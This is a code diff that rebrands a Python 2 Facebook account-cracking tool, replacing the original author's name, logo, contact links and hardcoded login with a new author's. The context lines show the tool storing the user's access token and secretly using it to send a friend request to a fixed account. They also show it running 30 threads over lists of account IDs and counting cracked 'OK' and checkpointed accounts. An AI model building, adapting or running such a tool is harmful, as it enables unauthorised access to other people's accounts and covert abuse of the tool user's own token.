@@ -51,18 +51,34 @@ def jalan(z):
 
 ##### LOGO #####
 logo = """
-           \033[1;97m::::::::    :::   :::   ::::::::::: 
-         \033[1;97m:+:    :+:  :+:+: :+:+:      :+:      
-        \033[1;92m+:+    +:+ +:+ +:+:+ +:+     +:+       
-       \033[1;92m+#+    +:+ +#+  +:+  +#+     +#+        
-      \033[1;92m+#+    +#+ +#+       +#+     +#+         
-     \033[1;92m#+#    #+# #+#       #+#     #+#          
-     \033[1;92m########  ###       ### ###########
+       .::!!!!!!!:.                                           .!!!!!:.                        .:!!!!!!!!!!!!
+  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
+      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
+      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$#
+      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
+      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
+        "*$bd$$$$      '*$$$$$$$$$$$o+#"
+             """"          """""""
+   _____             _ _
+  / ____|           (_) |
+ | (___   __ _  __ _ _| |__
+  \___ \ / _` |/ _` | | '_ \
+  ____) | (_| | (_| | | |_) |
+ |_____/ \__,_|\__, |_|_.__/
+                  | |
+                  |_|
+    
+               
+        
+        
+      
+     
+     
 \033[1;97m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;92m๑۩۩۩๑\033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
 \033[1;97mAuthor©\033[1;97m: \033[1;92mOmi Chaudhary
-\033[1;97mInstagram\033[1;97m: \033[1;92mhttps://www.Instagram.com/Omi6t
-\033[1;97mFacebook\033[1;97m: \033[1;92mhttps://www.facebook.com/Omi6t
-\033[1;97mWhatsapp\033[1;97m: \033[1;92m+923117675174
+\033[1;97mInstagram\033[1;97m: \033[1;92mhttps://www.Instagram.com/saqib
+\033[1;97mFacebook\033[1;97m: \033[1;92mhttps://www.facebook.com/saqib
+\033[1;97mWhatsapp\033[1;97m: \033[1;92m+923484160325
 \033[1;97m«-----------------------\033[1;92m✧✧\033[1;97m-----------------------»"""
 
 def tik():
@@ -88,10 +104,10 @@ print  """
 \033[1;44m | |/ |/ / /___/ /___/ /___/ /_/ / /  / / /___   \033[0m
 \033[1;44m |__/|__/_____/_____/\____/\____/_/  /_/_____/\033[0m
 \033[1;94m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;97m๑۩۩۩๑\033[1;94m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[1;94mAuthor©\033[1;91m: \033[1;97mOmi Chaudhary
-\033[1;94mInstagram\033[1;91m: \033[1;97mhttps://www.Instagram.com/Omi6t
-\033[1;94mFacebook\033[1;91m: \033[1;97mhttps://www.facebook.com/Omi6t
-\033[1;94mWhatsapp\033[1;91m: \033[1;97m+923117675174
+\033[1;94mAuthor©\033[1;91m: \033[1;97saqib ur rehman
+\033[1;94mInstagram\033[1;91m: \033[1;97mhttps://www.Instagram.com/Saqib
+\033[1;94mFacebook\033[1;91m: \033[1;97mhttps://www.facebook.com/Saqib
+\033[1;94mWhatsapp\033[1;91m: \033[1;97m+923484160325
 \033[1;94m«-----------------------\033[1;97m✧✧\033[1;94m-----------------------»\033[1;97m"""
 jalan("\033[1;41mDisclaimer:\033[0m \033[1;97mDeveloper Assume No Liability and Not")
 jalan("\033[1;97m            Responsible for any Misuse or Damage.")
@@ -103,8 +119,8 @@ print "\033[1;97mAccount that goes to Checkpoint is due to Facebook"
 print "\033[1;97mSecurity,Tool is not Responsible for this Thing..."
 print "\033[1;94m«-----------------\033[1;95mLogin With Tool\033[1;94m----------------»"
 
-CorrectUsername = "Omi6t"
-CorrectPassword = "Omi"
+CorrectUsername = "Saqib"
+CorrectPassword = "Saqib"
 
 loop = 'true'
 while (loop == 'true'):
@@ -117,10 +133,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;91mWrong Password"
-            os.system('xdg-open https://www.Facebook.com/Omi6t')
+            os.system('xdg-open https://www.Facebook.com/Saqib')
     else:
         print "\033[1;91mWrong Username"
-        os.system('xdg-open https://www.Facebook.com/Omi6t')
+        os.system('xdg-open https://www.Facebook.com/Saqib')
 
 def login():
 	os.system('clear')
@@ -163,7 +179,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;92mLogin Successful...'
-				os.system('xdg-open https://www.Facebook.com/Omi6t')
+				os.system('xdg-open https://www.Facebook.com/Saqib')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -415,7 +431,7 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;97m«-----------------------\033[1;92m✧✧\033[1;97m-----------------------»"
-	print "\033[1;91m«-----------Developed By Omi Chaudhary-----------»"
+	print "\033[1;91m«-----------Developed By Saqib ur rehman-----------»"
 	print '\033[1;92mProcess Has Been Completed\033[1;92m....'
 	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print """
